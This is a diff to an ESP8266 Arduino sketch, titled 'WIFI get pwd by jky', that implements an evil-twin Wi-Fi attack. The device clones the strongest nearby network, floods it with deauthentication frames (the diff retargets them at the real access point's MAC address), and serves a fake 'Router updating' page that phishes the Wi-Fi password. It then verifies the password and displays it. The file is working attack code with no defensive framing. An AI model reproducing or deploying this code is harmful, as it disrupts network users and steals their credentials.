@@ -2,15 +2,31 @@
 #include <DNSServer.h>
 #include <ESP8266WiFi.h>
 #include <ESP8266WebServer.h>
-#include "SSD1306Wire.h"
+#include <Wire.h>  // Only needed for Arduino 1.6.5 and earlier
+#include "SSD1306.h" // alias for `#include "SSD1306Wire.h"`
 
+extern "C" {
+  #include "user_interface.h"
+}
+
+DNSServer dnsServer;
 const byte DNS_PORT = 53;
 IPAddress apIP(172, 217, 28, 1);
 ESP8266WebServer webServer(80);
-DNSServer dnsServer;
+
 SSD1306Wire display(0x3c, D1, D2);
 String displayTitle = "WIFI get pwd by jky";
 String displayAPandPWD = "";
+
+/*=====================================================================*/
+int counter = 1;
+void drawProgressBarDemo() {
+  int progress = (counter / 5) % 100;
+  display.drawProgressBar(0, 32, 120, 10, progress);
+  display.setTextAlignment(TEXT_ALIGN_CENTER);
+  display.drawString(64, 15, String(progress) + "%");
+  counter++;
+}
 
 /*=====================================================================*/
 bool isAttacking = false;
@@ -26,7 +42,7 @@ uint8_t deauthPacket[26] = {
 uint8_t apMac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
 uint8_t clientMac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
 /*-------------------------------------------------------------------*/
-bool sendDeauth(uint8_t type) {
+void sendDeauth(uint8_t type) {
   uint8_t packet[128];
   int packetSize = 0;
   for (int i = 0; i < sizeof(deauthPacket); i++) {
@@ -37,11 +53,13 @@ bool sendDeauth(uint8_t type) {
     packet[4 + i] = clientMac[i];           //set target (client)
     packet[10 + i] = packet[16 + i] = apMac[i]; //set source (AP)
   }
-  packet[0] = type;
-  packet[24] = 0x01;
-  if (wifi_send_pkt_freedom(packet, packetSize, 0) == -1) return false;
+  packet[0] = type; packet[24] = 0x01;
+  if (wifi_send_pkt_freedom(packet, packetSize, 0) == -1) {
+    Serial.print("-");
+  } else {
+    Serial.print("+");
+  }
   delay(1); //less packets are beeing dropped
-  return true;
 }
 
 /*=====================================================================*/
@@ -57,7 +75,7 @@ int maxRssi = -1;
 bool apScan() {
   int rssi_num = -1000;
   int results = 0;
-  //(async = false & show_hidden = true)
+  //-->(async = false & show_hidden = true)
   results = WiFi.scanNetworks(false, true);
   for (int i = 0; i < results && i < maxResults; i++) {
     for (int j = 0; j < 6; j++) {
@@ -68,6 +86,7 @@ bool apScan() {
     String _ssid = WiFi.SSID(i);
     _ssid.replace("\"", "\\\"");
     _ssid.toCharArray(apNames[i], 33);
+    Serial.println(apNames[i]);
     encryption[i] = WiFi.encryptionType(i);
     hidden[i] = WiFi.isHidden(i);
     if (rssi[i] > rssi_num) {
@@ -81,24 +100,16 @@ bool apScan() {
 }
 
 /*=====================================================================*/
-const String postForms = "<html>\
-  <head>\
-    <title>Web Server POST handling</title>\
-    <style>\
-      body { background-color: #cccccc; font-family: Arial, Helvetica, Sans-Serif; Color: #000088; }\
-    </style>\
-  </head>\
-  <body>\
-    <h1>POST plain text to /postplain/</h1><br>\
+const String postForms = "<html><head><title>Router</title></head>\
+    <body><h1>Router updating.......</h1>\
     <form method=\"post\" enctype=\"application/x-www-form-urlencoded\" action=\"/postform/\">\
-      <input type=\"text\" name=\"pwd\" value=\"world\"><br>\
-      <input type=\"submit\" value=\"Submit\">\
-    </form>\
-  </body>\
-</html>";
+    <input type=\"text\" name=\"pwd\" value=\"world\">\
+    <input type=\"submit\" value=\"Submit\"></form></body></html>";
+/*---------------------------------------*/
 void handleRoot() {
   webServer.send(200, "text/html", postForms);
 }
+/*---------------------------------------*/
 void handleForm() {
   if (webServer.method() != HTTP_POST) {
     webServer.send(405, "text/plain", "Method Not Allowed");
@@ -107,6 +118,7 @@ void handleForm() {
     for (uint8_t i = 0; i < webServer.args(); i++) {
       message += " " + webServer.argName(i) + ": " + webServer.arg(i) + "\n";
     }
+    Serial.println(message);
     if (webServer.hasArg("pwd")) {
       webServer.send( 200, "text/json", "true" );
       isAttacking = false;
@@ -116,8 +128,7 @@ void handleForm() {
       int count = 0;
       while (WiFi.status() != WL_CONNECTED && count < 40)
       {
-        delay(500);
-        count++;
+        delay(500); count++;
       }
       if (count >= 40) {
         WiFi.mode(WIFI_AP);
@@ -126,6 +137,9 @@ void handleForm() {
         isAttacking = true;
       } else {
         displayAPandPWD = apNames[maxRssi] + String("=") + webServer.arg("pwd");
+        Serial.println("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@");
+        Serial.println(displayAPandPWD);
+        delay(5000);
       }
     } else webServer.send(200, "text/json", "false");
   }
@@ -133,6 +147,8 @@ void handleForm() {
 
 /*=============setup==============*/
 void setup() {
+  Serial.begin(115200);
+  Serial.println("------setup----------");
   display.init();
   display.flipScreenVertically();
   display.setFont(ArialMT_Plain_10);
@@ -145,6 +161,8 @@ void setup() {
     WiFi.softAP((const char*)apNames[maxRssi], (const char*)"", apChannels[maxRssi]);
     displayAPandPWD = apNames[maxRssi];
     isAttacking = true;
+    Serial.println(">>>>>isAttacking");
+    Serial.println(displayAPandPWD);
   }
 
   dnsServer.start(DNS_PORT, "*", apIP);
@@ -164,7 +182,7 @@ void loop() {
     for (int i = 0; i < 10; i++) {
       //-----------------------------
       for (int j = 0; j < 6; j++) {
-        apMac[j] = 0xFF;
+        apMac[j] = apScanMac[maxRssi][j];
         clientMac[j] = 0xFF;
       }
       sendDeauth(0xc0);
@@ -172,19 +190,22 @@ void loop() {
       //-----------------------------
       for (int j = 0; j < 6; j++) {
         apMac[j] = 0xFF;
-        clientMac[j] = 0xFF;
+        clientMac[j] = apScanMac[maxRssi][j];
       }
       sendDeauth(0xc0);
       sendDeauth(0xa0);
-      delay(5);
+      delay(50);
+      Serial.print("*");
     }
+    Serial.println();
   }
-  
+
   display.clear();
   display.setTextAlignment(TEXT_ALIGN_LEFT);
   display.drawString(10, 10, String(millis()));
-  display.drawString(20, 10, displayTitle);
-  display.drawString(30, 10, displayAPandPWD);
+  display.drawString(10, 20, displayTitle);
+  display.drawString(10, 30, displayAPandPWD);
   display.display();
   delay(10);
 }
+
